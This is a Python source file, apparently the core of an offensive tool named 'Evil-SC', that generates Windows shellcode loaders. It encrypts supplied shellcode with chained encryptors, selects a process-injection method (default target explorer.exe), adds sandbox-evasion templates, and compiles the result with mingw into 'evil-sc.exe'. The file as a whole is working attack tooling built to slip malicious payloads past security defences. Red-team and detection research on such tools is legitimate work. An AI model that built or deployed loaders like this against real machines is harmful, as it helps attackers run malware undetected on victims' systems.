import argparse
import os
import random
import string
from colorama import init, Fore
from core.utils.scUtils import *
from core.utils.CustomArgFormatter import CustomArgFormatter
from core.utils.cVariableUtils import *
import importlib
import re


def banner():
    init(autoreset=True)

    ascii_art = f"""
    {Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗   {Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗      {Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║      {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}╔════╝
    {Fore.CYAN}█████{Fore.GREEN}╗  {Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}█████{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}██{Fore.GREEN}╔══╝  ╚{Fore.CYAN}██{Fore.GREEN}╗ {Fore.CYAN}██{Fore.GREEN}╔╝{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║╚════╝╚════{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}███████{Fore.GREEN}╗ ╚{Fore.CYAN}████{Fore.GREEN}╔╝ {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}███████{Fore.GREEN}║╚{Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.GREEN}╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
    {Fore.CYAN}                                             @v4resk                         
    """

    print(ascii_art)



class esc:
    def __init__(self):
        self.target_process = ""
        self.shellcode_variable = ""
        self.method_file = ""
        self.encoder_files = []
        self.encrypt_folders = []
        self.encrypt_files = []
        self.encrypt_keys = []
        self.encrypt_py = []
        self.sandbox_evasion = []
        self.evil_sc_template_file = ""
        self.outfile = ""
        self.final_shellcode = ""

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='Template-based shellcode loader', formatter_class=CustomArgFormatter)
        parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the shellcode variable')

        parser.add_argument('-m', '--method', dest='method_folder', required=True, choices=self.get_available_folders("methods"),
                            help='Shellcode-loading method')

        parser.add_argument('-e', '--encrypt', action='append', dest='encrypt_folders', choices=self.get_available_folders("encryptors"),
                            help='Template-dependent encryption or encoding method to be applied to the shellcode')

        parser.add_argument('-ek', '--encrypt-key', action='append', dest='encrypt_keys', metavar='KEY',
                            help=f'A key to be used for --encrypt (auto-generated if empty)')

        parser.add_argument('-p', '--process', dest='target_process', metavar='PROCESS_NAME', default="explorer.exe",
                            help='Process name for shellcode injection')

        parser.add_argument('-se', '--sandbox-evasion', action='append', dest='sandbox_evasion',
                            choices=self.get_available_files("sandboxEvasion"),
                            help=f'Sandbox evasion technique')

        parser.add_argument('-o', '--outfile', dest='outfile', metavar='OUTPUT_FILE', default="evil-sc.exe",
                            help=f'Output filename')

        parser.add_argument('--encoder', action='append', dest='encoder_files', metavar='ENCODER',
                            help='Template-independent encoding method to be applied to the shellcode (default: sgn)')

        args = parser.parse_args()

        args.encrypt_files = []
        args.encrypt_py = []

        # Generate random keys for missing encryptors if necessary
        if args.encrypt_folders:
            key_length = 16  # Default key length, you can adjust it

            if not args.encrypt_keys:
                # Generate random keys for missing encryptors
                args.encrypt_keys = [self.generate_random_key(key_length) for _ in range(len(args.encrypt_folders))]
            elif len(args.encrypt_folders) > len(args.encrypt_keys):
                # Generate random keys for the missing encryptors
                missing_keys_count = len(args.encrypt_folders) - len(args.encrypt_keys)
                args.encrypt_keys.extend([self.generate_random_key(key_length) for _ in range(missing_keys_count)])
            elif len(args.encrypt_folders) < len(args.encrypt_keys):
                parser.print_help()
                print(f"\n{Fore.RED}Error: Number of encryptors and encrypt keys must be the same.")
                exit(1)

            # Separate encrypt_folders into cpp and py files
            for folder in args.encrypt_folders:
                cpp_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'encryptors', folder, f'{folder}.cpp')
                py_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'encryptors', folder, f'{folder}.py')
                args.encrypt_files.append(cpp_file_path)
                args.encrypt_py.append(py_file_path)

        return args

    def generate_random_key(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_available_files(self, folder):
        template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder)
        if not os.path.exists(template_folder):
            os.makedirs(template_folder)
        available_files = [file[:-4] for file in os.listdir(template_folder) if file.endswith('.cpp')]
        return available_files

    def get_available_folders(self,folder):
        methods_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder)
        if not os.path.exists(methods_folder):
            os.makedirs(methods_folder)
        available_methods = [folder for folder in os.listdir(methods_folder) if os.path.isdir(os.path.join(methods_folder, folder))]
        return available_methods

    def process_method_folder(self, method_folder):
        folder_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'methods', method_folder)
        if not os.path.exists(folder_path):
            print(f"Error: Method folder '{method_folder}' not found.")
            return None, None

        cpp_file_path = os.path.join(folder_path, f'{method_folder}.cpp')
        includes_file_path = os.path.join(folder_path, f'{method_folder}.includes')

        if not os.path.exists(cpp_file_path):
            print(f"Error: File '{method_folder}.cpp' not found in '{folder_path}'.")
            return None, None

        return cpp_file_path, includes_file_path

    def process_files(self, files, folder, extension='.cpp'):
        if files is None:
            return []

        processed_files = []
        for file in files:
            # Remove the extra extension if it's already present in the filename
            file_name = file if file.endswith(extension) else f'{file}{extension}'
            file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder, file_name)

            if os.path.exists(file_path):
                processed_files.append(file_path)
            else:
                print(f"Warning: File '{file_name}' not found in '{folder}'")

        return processed_files

    def generate_evil_sc_file(self):
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'loaderTemplate', 'template.cpp')
        
        with open(template_path, "r") as template_file:
            template_content = template_file.read()

        # Replace ###METHOD_MAIN### with user's chosen method content
        method_content = ""
        with open(self.method_file, "r") as method_file:
            method_content = method_file.read()
        evil_sc_content = template_content.replace("###METHOD_MAIN###", method_content)

        # Replace ###METHOD_INCLUDES### with user's chosen method includes content
        method_includes_content = ""
        with open(self.method_includes, "r") as includes_file:
            method_includes_content = includes_file.read()
        evil_sc_content = evil_sc_content.replace("###METHOD_INCLUDES###", method_includes_content)

        # Replace ###DECRYPT_FUNCTION### with user's chosen decryptor content
        encrypt_content = ""
        for encrypt_file in self.encrypt_files:
            with open(encrypt_file, "r") as encrypt_file_content:
                encrypt_content_temp = encrypt_file_content.read() + '\n'
                encrypt_content += replace_varX(encrypt_content_temp)
        evil_sc_content = evil_sc_content.replace("###DECRYPT_FUNCTION###", encrypt_content)

        # Import encryptors functions and encrypt/Create the shellcode
        temp_shellcode = file_to_cpp_sc(self.shellcode_variable)
        if self.encrypt_folders:
            temp_enc_shellcode = file_to_bytearray(self.shellcode_variable)
            for i in range(0,len(self.encrypt_folders)):
                ## Working for XOR
                encryptor = self.encrypt_folders[i]
                encryptor_key = self.encrypt_keys[i]
                encryptor_module_str = f"core.templates.encryptors.{encryptor}.{encryptor}"
                encryptor_module = __import__(encryptor_module_str, fromlist=[encryptor])
                encryptor_func = getattr(encryptor_module,encryptor)
                temp_enc_shellcode = encryptor_func(temp_enc_shellcode,encryptor_key)
                evil_sc_content = evil_sc_content.replace("###ENC_KEY###",encryptor_key,1)
            temp_shellcode = bytearray_to_cpp_sc(temp_enc_shellcode)
            
        final_shellcode = temp_shellcode

        # REPLACE Others
        evil_sc_content = evil_sc_content.replace("###TARGET_PROCESS###", self.target_process)
        evil_sc_content = evil_sc_content.replace("###SHELLCODE###",final_shellcode )
        

        self.evil_sc_template_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'loaderTemplate', 'evil-sc.cpp')
        with open(self.evil_sc_template_file, "w") as evil_sc_file:
            evil_sc_file.write(evil_sc_content)
    

    def build_evil_sc_loader(self):
        os.system(f"x86_64-w64-mingw32-g++ {self.evil_sc_template_file} -o {self.outfile}" )

    def run(self):
        args = self.parse_arguments()

        self.shellcode_variable = args.shellcode_variable
        self.target_process = args.target_process

        self.method_file, self.method_includes = self.process_method_folder(args.method_folder)
        if self.method_file is None:
            return

        self.encrypt_folders = args.encrypt_folders
        self.encrypt_files = self.process_files(args.encrypt_files, 'encryptors', extension='.cpp')
        self.encrypt_py_files = self.process_files(args.encrypt_py, 'encryptors', extension='.py')
        self.sandbox_evasion = self.process_files(args.sandbox_evasion, 'sandboxEvasion', extension='.cpp')
        self.encrypt_keys = args.encrypt_keys
        self.outfile = args.outfile

        print(f'{Fore.GREEN}Shellcode:\t\t{Fore.WHITE} {self.shellcode_variable}')
        print(f'{Fore.GREEN}Method File:\t\t{Fore.WHITE} {os.path.basename(self.method_file)}')
        print(f'{Fore.GREEN}Method Includes File:\t{Fore.WHITE} {os.path.basename(self.method_includes)}')
        print(f'{Fore.GREEN}encryptors CPP:\t\t{Fore.WHITE}{[os.path.basename(file) for file in self.encrypt_files]}')
        print(f'{Fore.GREEN}encryptors PY:\t\t{Fore.WHITE}{[os.path.basename(file) for file in self.encrypt_py_files]}')
        print(f'{Fore.GREEN}Encrypt Keys:\t\t{Fore.WHITE}{self.encrypt_keys}')
        print(f'{Fore.GREEN}Sandbox Evasion:\t{Fore.WHITE}{[os.path.basename(file) for file in self.sandbox_evasion]}')
        print(f'{Fore.GREEN}Target Process:\t\t{Fore.WHITE}{self.target_process}')
        
        self.generate_evil_sc_file()
        self.build_evil_sc_loader()

        print(f"\n{Fore.CYAN}Genreated template:\t{Fore.WHITE}{self.evil_sc_template_file}")
        print(f"{Fore.CYAN}Output:\t\t\t{Fore.WHITE}{self.outfile}")